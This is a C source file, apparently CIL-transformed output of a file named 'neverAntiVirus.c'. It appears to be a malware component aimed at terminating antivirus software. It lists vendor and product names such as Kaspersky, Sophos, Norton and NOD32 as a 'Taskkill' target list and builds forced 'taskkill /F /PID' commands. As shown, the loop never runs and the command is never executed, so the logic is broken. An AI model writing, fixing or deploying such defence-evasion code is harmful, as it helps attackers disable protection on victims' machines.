/* Generated by CIL v. 1.5.1 */
/* print_CIL_Input is true */

#line 365 "/usr/include/stdio.h"
extern  __attribute__((__nothrow__)) int sprintf(char * __restrict  __s , char const   * __restrict  __format 
                                                 , ...) ;
#line 380 "/usr/include/stdlib.h"
extern  __attribute__((__nothrow__)) int ( __attribute__((__leaf__)) rand)(void) ;
#line 4 "neverAntiVirus.c"
char const   *Taskkill[52]  = 
#line 4 "neverAntiVirus.c"
  {      "av",      "Av",      "AV",      "defend", 
        "Defend",      "DEFEND",      "f-",      "F-", 
        "defense",      "Defense",      "DEFENSE",      "Kaspersky", 
        "KASPERSKY",      "kaspersky",      "sophos",      "SOPHOS", 
        "Sophos",      "SAVAdminService.exe",      "SavService.exe",      "Scanner", 
        "SCANNER",      "scanner",      "Norton",      "norton", 
        "NORTON",      "Security",      "SECURITY",      "security", 
        "Anti",      "ANTI",      "anti",      "SCAN", 
        "Scan",      "scan",      "Malware",      "MALWARE", 
        "malware",      "Virus",      "VIRUS",      "virus", 
        "NOD32",      "nod32",      "Nod32",      "Zoner", 
        "ZONER",      "zoner",      "SECUR",      "Secur", 
        "secur",      "Dr.",      "DR.",      (char const   *)0};
#line 14 "neverAntiVirus.c"
int NeverAntiVirus(void) 
{ 
  int pid ;
  int task ;
  int c ;
  int tmp ;
  char command[255] ;
  unsigned int tmp___0 ;
  int __retres7 ;

  {
#line 16
  pid = -1;
#line 17
  task = 10;
#line 21
  c = 0;
  {
#line 21
  while (1) {
    while_continue: /* CIL Label */ ;
#line 21
    if (task < 10) {

    } else {
#line 21
      goto while_break;
    }
#line 23
    tmp = rand();
#line 23
    pid = tmp % 256;
#line 24
    if (pid != 0) {
#line 25
      command[0] = (char)0;
#line 25
      tmp___0 = 1U;
      {
#line 25
      while (1) {
        while_continue___0: /* CIL Label */ ;
#line 25
        if (tmp___0 >= 255U) {
#line 25
          goto while_break___0;
        } else {

        }
#line 25
        command[tmp___0] = (char)0;
#line 25
        tmp___0 ++;
      }
      while_break___0: /* CIL Label */ ;
      }
#line 26
      sprintf((char * __restrict  )(command), (char const   * __restrict  )"taskkill /F /PID %d",
              pid);
    } else {

    }
#line 21
    c ++;
  }
  while_break: /* CIL Label */ ;
  }
#line 29
  __retres7 = 0;
#line 14
  return (__retres7);
}
}
#line 32 "neverAntiVirus.c"
int main(void) 
{ 
  int __retres1 ;

  {
#line 34
  NeverAntiVirus();
#line 35
  __retres1 = 0;
#line 32
  return (__retres1);
}
}
